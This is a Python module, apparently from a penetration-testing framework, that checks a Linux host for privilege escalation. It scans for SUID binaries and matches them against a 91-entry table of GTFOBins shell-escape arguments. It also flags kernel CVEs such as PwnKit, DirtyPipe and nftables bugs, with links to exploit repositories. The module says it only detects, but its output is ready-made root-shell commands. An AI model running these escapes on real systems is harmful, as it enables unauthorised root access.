"""
@module: priv_esc
@desc: Linux 提权检测(SUID + 内核 CVE,只检测不利用,结果供人工确认)
@result: priv_esc_parse 处理器回填注册表 (Q7)
"""
import getpass
import json
import os
import re
import subprocess

MODULE = {
    "desc": "Linux 提权检测(SUID + 内核 CVE,只检测不利用)",
    "params": [],
    "result_processor": "priv_esc_parse",
}

# ── 数据:GTFBins 可滥用二进制清单(提取自 liamg/traitor gtfobins.go,91 条) ──
# binary -> {args: 利用参数模板, inputs: 交互输入, envs: 环境变量}
SUID_BINS = {
    'apt-get': {"args": ['changelog', 'apt'], "inputs": ['!/bin/sh\n'], "envs": []},
    'apt': {"args": ['changelog', 'apt'], "inputs": ['!/bin/sh\n'], "envs": []},
    'awk': {"args": ['BEGIN {system("/bin/sh")}'], "inputs": ['\n'], "envs": []},
    'bundler': {"args": ['help'], "inputs": ['!/bin/sh\n'], "envs": []},
    'busctl': {"args": ['--show-machine'], "inputs": ['!/bin/sh\n'], "envs": []},
    'busybox': {"args": ['sh'], "inputs": [], "envs": []},
    'byebug': {"args": ['$PWNFILE'], "inputs": ['continue\n'], "envs": []},
    'capsh': {"args": ['--'], "inputs": [], "envs": []},
    'check_by_ssh': {"args": ['-o', 'ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)', '-H', 'localhost', '-C', 'xx'], "inputs": [], "envs": []},
    'check_cups': {"args": ['-xFj', '--frelax-syntax-checks', '$PWNFILE'], "inputs": [], "envs": []},
    'cowsay': {"args": ['-f', '$PWNFILE', 'x'], "inputs": [], "envs": []},
    'cowthink': {"args": ['-f', '$PWNFILE', 'x'], "inputs": [], "envs": []},
    'cpulimit': {"args": ['-l', '100', '-f', '/bin/sh'], "inputs": [], "envs": []},
    'crash': {"args": ['-h'], "inputs": ['!sh\n'], "envs": []},
    'csh': {"args": [''], "inputs": [''], "envs": []},
    'dash': {"args": [''], "inputs": [''], "envs": []},
    'dmesg': {"args": ['-h'], "inputs": ['!/bin/sh\n'], "envs": []},
    'dpkg': {"args": ['-l'], "inputs": ['!/bin/sh\n'], "envs": []},
    'eb': {"args": ['logs'], "inputs": ['!/bin/sh\n'], "envs": []},
    'emacs': {"args": ['-Q', '-nw', '--eval', '(term "/bin/sh")'], "inputs": [], "envs": []},
    'env': {"args": ['/bin/sh'], "inputs": [], "envs": []},
    'expect': {"args": ['-c', 'spawn /bin/sh;interact'], "inputs": [], "envs": []},
    'find': {"args": ['find', '.', '-exec', '/bin/sh', '\\;', '-quit'], "inputs": [], "envs": []},
    'flock': {"args": ['-u', '/', '/bin/sh'], "inputs": [], "envs": []},
    'gawk': {"args": ['BEGIN {system("/bin/sh")}'], "inputs": [], "envs": []},
    'gcc': {"args": ['-wrapper', '/bin/sh,-s', '.'], "inputs": [], "envs": []},
    'gdb': {"args": ['-nx', '-ex', "'!sh'", '-ex', 'quit'], "inputs": [], "envs": []},
    'gem': {"args": ['open', '-e', '/bin/sh -c /bin/sh', 'rdoc'], "inputs": [''], "envs": []},
    'ghc': {"args": ['-e', 'System.Process.callCommand "/bin/sh"'], "inputs": [], "envs": []},
    'gimp': {"args": ['-idf', '--batch-interpreter=python-fu-eval', '-b', 'import os; os.system("sh")'], "inputs": [], "envs": []},
    'git': {"args": ['-p', 'help'], "inputs": [], "envs": ['PAGER=\'sh -c "exec sh 0<&1"\'']},
    'gtester': {"args": ['-q', '$PWNFILE'], "inputs": [], "envs": []},
    'ionice': {"args": ['/bin/sh'], "inputs": [], "envs": []},
    'jrunscript': {"args": ['-e', "exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"], "inputs": [], "envs": []},
    'less': {"args": ['-f', '/dev/null'], "inputs": ['!/bin/sh\n'], "envs": []},
    'logsave': {"args": ['/dev/null', '/bin/sh', '-i'], "inputs": [], "envs": []},
    'ltrace': {"args": ['-b', '-L', '/bin/sh'], "inputs": [], "envs": []},
    'lua': {"args": ['-e', 'os.execute("/bin/sh")'], "inputs": [], "envs": []},
    'mail': {"args": ["--exec='!/bin/sh'"], "inputs": [], "envs": []},
    'make': {"args": ['-s', '--eval=$\'x:\\n\\t-\'"${COMMAND}"'], "inputs": [], "envs": ['COMMAND=/bin/sh']},
    'man': {"args": ['man'], "inputs": ['!/bin/sh\n'], "envs": []},
    'mawk': {"args": ['BEGIN {system("/bin/sh")}'], "inputs": [], "envs": []},
    'more': {"args": ['/etc/profile'], "inputs": ['!/bin/sh\n'], "envs": ['TERM=']},
    'mysql': {"args": ['-e', '\\! /bin/sh'], "inputs": [], "envs": []},
    'nawk': {"args": ['BEGIN {system("/bin/sh")}'], "inputs": [], "envs": []},
    'nice': {"args": ['/bin/sh'], "inputs": [], "envs": []},
    'nmap': {"args": ['--script=$PWNFILE'], "inputs": ['\n'], "envs": []},
    'node': {"args": ['-e', 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'], "inputs": [], "envs": []},
    'nohup': {"args": ['/bin/sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)'], "inputs": [], "envs": []},
    'nsenter': {"args": ['/bin/sh'], "inputs": [], "envs": []},
    'pdb': {"args": ['$PWNFILE'], "inputs": ['cont\n'], "envs": []},
    'perl': {"args": ['-e', 'exec "/bin/sh";'], "inputs": [], "envs": []},
    'pg': {"args": ['/etc/profile'], "inputs": ['!/bin/sh\n'], "envs": []},
    'php': {"args": ['-r', 'system(getenv("PWN"));'], "inputs": [], "envs": ['PWN=/bin/sh']},
    'pic': {"args": ['-U'], "inputs": ['.PS\n', 'sh X sh X\n'], "envs": []},
    'pico': {"args": [''], "inputs": ['reset; sh 1>&0 2>&0\r\n'], "envs": []},
    'puppet': {"args": ['apply', '-e', 'exec { \'/bin/sh -c "exec sh -i <$(tty) >$(tty) 2>$(tty)"\': }'], "inputs": [], "envs": []},
    'python': {"args": ['-c', 'import os; os.system("/bin/sh")'], "inputs": [], "envs": []},
    'rake': {"args": ['-p', '`/bin/sh 1>&0`'], "inputs": [], "envs": []},
    'rlwrap': {"args": ['/bin/sh'], "inputs": [], "envs": []},
    'rpm': {"args": ['eval', '%{lua:os.execute("/bin/sh")}'], "inputs": [], "envs": []},
    'rpmquery': {"args": ['eval', '%{lua:os.execute("/bin/sh")}'], "inputs": [], "envs": []},
    'rsync': {"args": ['-e', 'sh -c "sh 0<&2 1>&2"', '127.0.0.1:/dev/null'], "inputs": [], "envs": []},
    'ruby': {"args": ['-e', 'exec "/bin/sh"'], "inputs": [], "envs": []},
    'run-mailcap': {"args": ['--action=view', '/etc/hosts'], "inputs": ['!/bin/sh\n'], "envs": []},
    'run-parts': {"args": ['--new-session', '--regex', '^sh$', '/bin'], "inputs": [], "envs": []},
    'rview': {"args": ['-c', ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'], "inputs": [], "envs": []},
    'rvim': {"args": ['-c', ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'], "inputs": [], "envs": []},
    'scp': {"args": ['-S', '$PWNFILE', 'x', 'y'], "inputs": [], "envs": []},
    'script': {"args": ['-q', '/dev/null'], "inputs": [], "envs": []},
    'sed': {"args": ['-n', '1e exec sh 1>&0', '/etc/hosts'], "inputs": [], "envs": []},
    'service': {"args": ['../../../../../bin/sh'], "inputs": [], "envs": []},
    'setarch': {"args": ['x86_64', '/bin/sh'], "inputs": [], "envs": []},
    'sftp': {"args": ['-o', 'StrictHostKeyChecking=no', 'demo@test.rebex.net'], "inputs": ['password\n', '!/bin/sh\n'], "envs": []},
    'slsh': {"args": ['-e', 'system("/bin/sh")'], "inputs": [], "envs": []},
    'socat': {"args": ['stdin', 'exec:/bin/sh'], "inputs": [], "envs": []},
    'split': {"args": ['--filter=/bin/sh', '/dev/stdin'], "inputs": [], "envs": []},
    'sqlite3': {"args": ['/dev/null', '.shell /bin/sh'], "inputs": [], "envs": []},
    'ssh': {"args": ['-o', "ProxyCommand=';sh 0<&2 1>&2'", 'x'], "inputs": [], "envs": []},
    'start-stop-daemon': {"args": ['-n', '$RANDOM', '-S', '-x', '/bin/sh'], "inputs": [], "envs": []},
    'stdbuf': {"args": ['-i0', '/bin/sh'], "inputs": [], "envs": []},
    'strace': {"args": ['-o', '/dev/null', '/bin/sh'], "inputs": [], "envs": []},
    'tar': {"args": ['-cf', '/dev/null', '/dev/null', '--checkpoint=1', '--checkpoint-action=exec=/bin/sh'], "inputs": [], "envs": []},
    'taskset': {"args": ['1', '/bin/sh'], "inputs": [], "envs": []},
    'time': {"args": ['/bin/sh'], "inputs": [], "envs": []},
    'timeout': {"args": ['7d', '/bin/sh'], "inputs": [], "envs": []},
    'unshare': {"args": ['/bin/sh'], "inputs": [], "envs": []},
    'valgrind': {"args": ['/bin/sh'], "inputs": [], "envs": []},
    'watch': {"args": ['-x', 'sh', '-c', 'reset; exec sh 1>&0 2>&0'], "inputs": [], "envs": []},
    'xargs': {"args": ['-a', '/dev/null', 'sh'], "inputs": [], "envs": []},
    'zip': {"args": ['$PWNFILE', '/etc/hosts', '-T', '-TT', 'sh #'], "inputs": ['\r\n'], "envs": []},
}

# ── 信息收集 ────────────────────────────────────────────────────

def _sh(cmd, timeout=10):
    """执行 shell 命令,返回 stdout(失败/超时返回空串,不抛异常)。"""
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                           timeout=timeout, executable="/bin/sh")
        return (r.stdout or "").strip()
    except Exception:
        return ""


def _collect_state():
    """收集目标机基础状态:内核/发行版/用户/权限/能力/可写点。"""
    state = {}
    # 内核版本(uname -r 优先,/proc/version 兜底)
    uname_r = _sh("uname -r")
    proc_ver = _sh("cat /proc/version 2>/dev/null")
    m = re.search(r"Linux version (\d+\.\d+(?:\.\d+)*)", proc_ver)
    fallback = m.group(1) if m else ""
    state["kernel"] = uname_r or fallback or ""
    state["kernel_base"] = re.sub(r"-\S+$", "", uname_r) or fallback or ""
    # 发行版
    rel = _sh("cat /etc/os-release 2>/dev/null")
    pretty = re.search(r'PRETTY_NAME="?([^"\n]+)', rel)
    idd = re.search(r'^ID="?([a-zA-Z]+)', rel, re.M)
    state["distro"] = pretty.group(1) if pretty else "unknown"
    state["distro_id"] = (idd.group(1) or "").lower() if idd else "unknown"
    # 用户
    try:
        state["uid"] = int(os.getuid())
        state["user"] = getpass.getuser()
    except Exception:
        state["uid"] = -1
        state["user"] = ""
    state["root"] = state["uid"] == 0
    state["sudo"] = bool(_sh("command -v sudo"))
    # capabilities(CapEff hex → 常见 cap 名)
    cap_eff = _sh("grep CapEff /proc/self/status 2>/dev/null") or ""
    cap_names = []
    try:
        cap_hex = cap_eff.split("\t")[-1].strip()
        cap_val = int(cap_hex, 16) if cap_hex else 0
        _CAPS = ["chown", "dac_override", "dac_read_search", "fowner", "fsetid", "kill",
                 "setgid", "setuid", "setpcap", "linux_immutable", "net_bind_service",
                 "net_broadcast", "net_admin", "net_raw", "ipc_lock", "ipc_owner",
                 "sys_module", "sys_rawio", "sys_chroot", "sys_ptrace", "sys_pacct",
                 "sys_admin", "sys_boot", "sys_nice", "sys_resource", "sys_time",
                 "sys_tty_config", "mknod", "lease", "audit_write", "audit_control",
                 "setfcap", "mac_override", "mac_admin", "syslog", "wake_alarm",
                 "block_suspend", "audit_read", "perfmon", "bpf", "checkpoint_restore"]
        cap_names = [_CAPS[i] for i in range(min(64, len(_CAPS))) if cap_val & (1 << i)]
    except Exception:
        pass
    state["caps"] = cap_names
    # 可写点
    state["writable"] = {
        "etc_passwd": bool(os.access("/etc/passwd", os.W_OK)),
        "etc_shadow": bool(os.access("/etc/shadow", os.W_OK)),
        "usr_local_bin": bool(os.access("/usr/local/bin", os.W_OK)),
        "root_dir": bool(os.access("/root", os.W_OK)),
    }
    return state


# ── SUID 检测 ───────────────────────────────────────────────────

_SUID_DIRS = "/usr /bin /sbin /opt /home"


def _scan_suid():
    """find 扫描 SUID 二进制(-xdev 不跨文件系统,限常见目录,30s 超时)。"""
    out = _sh(f"find {_SUID_DIRS} -xdev -perm -4000 -type f 2>/dev/null", timeout=30)
    bins, seen = [], set()
    for line in out.splitlines():
        line = line.strip()
        if not line:
            continue
        base = os.path.basename(line)
        if base in seen:
            continue
        seen.add(base)
        bins.append({"binary": line, "base": base})
    return bins


def _build_hint(binary, entry):
    """由 GTFOBins 参数生成利用命令提示。"""
    args = entry.get("args") or []
    if args and args[0] == binary:
        cmd = " ".join(args)
    else:
        cmd = " ".join([binary] + args)
    hint = cmd or f"{binary}(无内置利用参数,查 gtfobins.github.io)"
    inputs = entry.get("inputs") or []
    if inputs:
        hint += "   # 交互输入: " + " ; ".join(repr(i) for i in inputs)
    if entry.get("envs"):
        hint += "   # 环境: " + ",".join(entry["envs"])
    return hint


def _match_gtfobins(bins):
    found = []
    for b in bins:
        entry = SUID_BINS.get(b["base"])
        if entry:
            found.append({"binary": b["binary"], "base": b["base"],
                          "gtfobins": True, "exploit_hint": _build_hint(b["base"], entry)})
        else:
            found.append({"binary": b["binary"], "base": b["base"],
                          "gtfobins": False, "exploit_hint": ""})
    return found


# ── 内核 CVE 检测 ───────────────────────────────────────────────
# 格式参照 kernelCTF metadata:vulnerability.affected_versions(闭区间)+ requirements(条件)
# 全部为启发式(heuristic=True):发行版可能 backport 修复而版本号未变,需人工验证。

def _ver_to_tuple(v):
    """'5.15.25' → (5,15,25);兼容 '5.15' / '5.15.25-generic' 后缀。"""
    if not v:
        return None
    m = re.match(r"(\d+)(?:\.(\d+))?(?:\.(\d+))?", str(v).strip())
    if not m:
        return None
    return (int(m.group(1)), int(m.group(2) or 0), int(m.group(3) or 0))


def _in_range(ver, lo, hi):
    if not ver:
        return False
    return lo <= ver <= hi


def _have(cmd):
    """条件探测:命令/路径存在性。"""
    return bool(_sh(cmd, timeout=5))


def _check_condition(cond, state):
    if not cond:
        return True
    if cond == "pkexec":
        return _have("command -v pkexec")
    if cond == "pkexec_ver":
        # polkit 版本区间 0.105 ≤ v < 0.120(pkexec --version 输出如 "pkexec version 124")
        out = _sh("pkexec --version 2>/dev/null")
        m = re.search(r"(\d+)", out)
        if not m:
            return False
        return 0 <= int(m.group(1)) < 120
    if cond == "overlayfs":
        return _have("grep -q overlay /proc/filesystems")
    if cond == "nft":
        return _have("command -v nft")
    if cond == "not_root":
        return not state.get("root")
    return True


CVE_CHECKS = [
    {"cve": "CVE-2021-4034", "name": "PwnKit(polkit pkexec)",
     "versions": None, "condition": "pkexec",
     "exploit": "CVE-2021-4034/pwnkit:pkexec 内存损坏提权,版本无关;exploit 见 github.com/berdav/CVE-2021-4034"},
    {"cve": "CVE-2022-0847", "name": "DirtyPipe(pipe 内核缺陷)",
     "versions": ("5.8.0", "5.16.11"),
     "branches": [("5.15.0", "5.15.24"), ("5.10.0", "5.10.101")],
     "condition": "not_root",
     "exploit": "DirtyPipe:可覆写只读文件/劫持 suid 二进制;exploit-db 50808 / github.com/AlexisAhmed/CVE-2022-0847"},
    {"cve": "CVE-2021-3493", "name": "OverlayFS(Ubuntu)",
     "versions": None, "distro": ["ubuntu"], "condition": "overlayfs",
     "exploit": "OverlayFS 提权(ubuntu overlayfs 任意文件写);github.com/offensive-security/exploitdb 37292"},
    {"cve": "CVE-2023-0386", "name": "OverlayFS 内核缺陷",
     "versions": ("5.11.0", "6.2.0"), "condition": "overlayfs",
     "exploit": "OverlayFS FUSE 提权;github.com/xkaneiki/CVE-2023-0386"},
    {"cve": "CVE-2023-32233", "name": "nftables UAF",
     "versions": ("6.1.0", "6.3.1"), "condition": "nft",
     "exploit": "nftables Use-After-Free 提权;github.com/onemorecircle/linux-kernel-exploits CVE-2023-32233"},
    {"cve": "CVE-2024-1086", "name": "nftables(nft_verdict_init)",
     "versions": ("5.14.0", "6.6.0"), "condition": "nft",
     "exploit": "nftables 双重释放提权;github.com/Notselwyn/CVE-2024-1086"},
    {"cve": "CVE-2021-3560", "name": "polkit D-Bus 提权",
     "versions": None, "distro": ["debian", "ubuntu", "fedora", "centos"],
     "condition": "pkexec_ver",
     "exploit": "polkit dbus 竞态提权;github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Escalation"},
]


def _scan_cves(state):
    """内核版本 + 条件匹配 CVE 清单。全部 heuristic。"""
    findings = []
    kv = _ver_to_tuple(state.get("kernel_base", ""))
    distro = state.get("distro_id", "")
    for c in CVE_CHECKS:
        # 版本区间
        if c.get("versions"):
            lo = _ver_to_tuple(c["versions"][0])
            hi = _ver_to_tuple(c["versions"][1])
            if not (lo and hi and _in_range(kv, lo, hi)):
                continue
            ver_note = f"{c['versions'][0]} <= {state.get('kernel_base', '?')} <= {c['versions'][1]}"
        else:
            ver_note = "版本无关"
        # 分支区间(额外:5.15.x<25 等)
        branch_note = ""
        if c.get("branches"):
            for blo, bhi in c["branches"]:
                blo_t, bhi_t = _ver_to_tuple(blo), _ver_to_tuple(bhi)
                if kv and blo_t and bhi_t and blo_t <= kv <= bhi_t:
                    branch_note = f"(分支命中 {blo}-{bhi})"
                    break
        # 发行版匹配(硬过滤:发行版专属漏洞不跨发行版报)
        if c.get("distro") and distro and distro not in c["distro"]:
            continue
        # 条件:not_root / pkexec_ver 为硬过滤(root 无提权意义;polkit 版本明确不满足=已修复);
        # 能力类条件(overlayfs/nft/pkexec)未确认时降级为"条件未确认"标注,不跳过——
        # 版本命中本身就有参考价值(启发式,需人工验证)
        cond = c.get("condition")
        if cond == "not_root":
            if state.get("root"):
                continue
            cond_note = ""
        elif cond == "pkexec_ver":
            if not _check_condition(cond, state):
                continue
            cond_note = ""
        elif cond:
            if _check_condition(cond, state):
                cond_note = ""
            else:
                cond_note = f"[条件未确认:{cond}]"
        else:
            cond_note = ""
        findings.append({"cve": c["cve"], "name": c["name"],
                         "kernel": state.get("kernel", ""),
                         "match": ver_note + (" " + branch_note if branch_note else ""),
                         "exploit_hint": c["exploit"],
                         "heuristic": True,
                         "condition_note": cond_note})
    return findings


# ── 入口 ────────────────────────────────────────────────────────

def run():
    """输出 JSON: {"kernel": ..., "distro": ..., "user": ..., "suid": [...], "cve": [...], "writable": {...}}"""
    state = _collect_state()
    suid = _match_gtfobins(_scan_suid())
    cve = _scan_cves(state)
    return json.dumps({
        "kernel": state.get("kernel", ""),
        "kernel_base": state.get("kernel_base", ""),
        "distro": state.get("distro", ""),
        "user": state.get("user", ""),
        "root": state.get("root", False),
        "caps": state.get("caps", []),
        "writable": state.get("writable", {}),
        "suid": suid,
        "cve": cve,
    }, ensure_ascii=False)


if __name__ == "__main__":
    print(run())
